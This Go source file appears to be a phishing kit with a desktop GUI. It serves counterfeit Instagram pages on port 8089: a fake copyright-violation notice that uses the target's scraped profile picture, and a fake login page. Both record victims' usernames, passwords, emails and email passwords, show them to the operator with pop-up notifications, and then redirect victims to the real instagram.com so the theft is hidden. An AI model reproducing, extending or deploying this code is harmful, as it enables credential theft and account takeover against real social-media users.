package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"

	"fyne.io/fyne/dialog"
	"fyne.io/fyne/widget"

	"fyne.io/fyne"

	"github.com/PuerkitoBio/goquery"
	"github.com/raifpy/Go/errHandler"
)

func getImage(username string) string {

	req, err := http.NewRequest("GET", "https://instagram.com/"+username, nil)
	if errHandler.HandlerBool(err) {
		return ""
	}

	req.Header.Add("Accept-Encoding", "text")
	req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0")

	cli := http.Client{}
	response, err := cli.Do(req)
	if errHandler.HandlerBool(err) {
		return ""
	}

	/*browser := surf.NewBrowser()
	browser.SetUserAgent("Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36")
	browser.Open("https://m.instagram.com/" + username)*/

	if response.StatusCode != 200 {
		log.Println("200 dönmeyen kod!")
		return ""
	}

	ham, _ := ioutil.ReadAll(response.Body)
	q, err := goquery.NewDocumentFromReader(bytes.NewBufferString(string(ham)))
	if errHandler.HandlerBool(err) {
		return ""
	}
	/*q.Find("meta").Each(func(_ int, s *goquery.Selection) {
		// hü
		fmt.Println(s.Find("property").Text())
	})*/
	var url string
	q.Find("meta").Each(func(_ int, s *goquery.Selection) {
		imageURL, ok := s.Attr("content")
		if ok && strings.HasPrefix(imageURL, "https://instagram.fist") {
			url = imageURL
		}
	})

	//fmt.Println(string(ham))
	return url
}

func serveInstagramTelif(win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
	serveFunc := func(response http.ResponseWriter, req *http.Request) {
		log.Println("Requests -> ", req.Form.Encode())
		query := req.URL.Query()
		if key, ok := query["nick"]; ok {
			if !errHandler.HandlerBool(req.ParseForm()) {
				mail := req.FormValue("mail")
				pass := req.FormValue("password")
				mailPass := req.FormValue("mailpass")

				if mail != "" || pass != "" {
					log.Printf("UserName = %s\nEmail = %s\nPassw = %s\nEmailPass = %s\n\n", key[0], mail, pass, mailPass)
					*textStream += "\nUserName = " + key[0] + "\nEmail = " + mail + "\nPass = " + pass + "\nMPass = " + mailPass + "\n"
					textGrid.SetText(*textStream)
					notiApp.SendNotification(fyne.NewNotification("New Form", mail+" : "+pass))
					http.Redirect(response, req, "https://instagram.com", 301)
					return
				}
				*textStream += "New Requests For @" + key[0] + "\n"
				textGrid.SetText(*textStream)
			} else {
				log.Println("Error to req.ParseFrom")
			}

			keyStr := strings.Replace(key[0], "@", "", 1)
			log.Println("UserName -> ", keyStr)
			imageURL := getImage(keyStr)
			if imageURL == "" {
				imageURL = "https://instagram.com/static/images/ico/xxxhdpi_launcher.png/9fc4bab7565b.png"
				fmt.Fprintln(response, strings.Replace(strings.Replace(userNotFound, "&&user&&", keyStr, -1), "&&pp&&", imageURL, -1))
				return
			}
			fmt.Fprintln(response, strings.Replace(strings.Replace(pw, "&&user&&", keyStr, -1), "&&pp&&", imageURL, -1))
			return

		}
		log.Println("Returning first page")
		fmt.Fprintln(response, instagramCheckUsername)
	}
	http.HandleFunc("/", serveFunc)
	err := http.ListenAndServe(":8089", nil)
	dialog.ShowError(err, win)
}

func serveInstagramLogin(win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
	serveFunc := func(res http.ResponseWriter, req *http.Request) {

		if !errHandler.HandlerBool(req.ParseForm()) {
			if ip := req.FormValue("ip"); ip != "" {
				log.Println(ip)
				*textStream += ip
				textGrid.SetText(*textStream)
			}
			username := req.FormValue("username")
			password := req.FormValue("password")
			if username != "" && password != "" {
				*textStream += "UserName = " + username + "\nPassword = " + password + "\n"
				textGrid.SetText(*textStream)
				notiApp.SendNotification(fyne.NewNotification("New Form", username+" : "+password))
				http.Redirect(res, req, "https://instagram.com", 301)
			}
		}
		*textStream += "New Request\n"
		textGrid.SetText(*textStream)
		fmt.Fprintln(res, instagramLoginHtml)
		return

	}
	http.HandleFunc("/", serveFunc)
	http.ListenAndServe(":8089", nil)
}
